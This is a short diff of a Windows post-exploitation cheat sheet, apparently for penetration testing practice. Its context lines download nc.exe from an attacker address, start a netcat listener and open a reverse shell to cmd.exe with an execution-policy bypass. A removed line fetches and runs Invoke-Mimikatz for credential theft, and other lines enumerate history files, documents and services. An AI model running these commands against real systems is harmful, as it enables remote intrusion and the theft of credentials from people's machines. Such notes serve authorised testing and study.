@@ -15,7 +15,6 @@ iwr -uri $OUR_IP/nc.exe -outfile nc.exe
 rlwrap -crA nc -lvnp 9002 # On kali box
 .\nc.exe $OUR_IP 9002 -e cmd.exe
 powershell -ep bypass
-iex(new-object new.webclient).downloadstring("$IP/Invoke-Mimikatz.ps1")
 ```
 
 ## Enumeration
@@ -70,7 +69,7 @@ Get-ChildItem -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -File -Recurse 
 
 # Check command history
 Get-History
-(Get-PSReadlineOption).HistorySavePath
+ls C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
 
 # Check services
 Get-CimInstance -ClassName win32_service | Select ProcessId, Name, State, PathName | Sort-Object ProcessId | Where-Object {$_.State -like 'Running'}
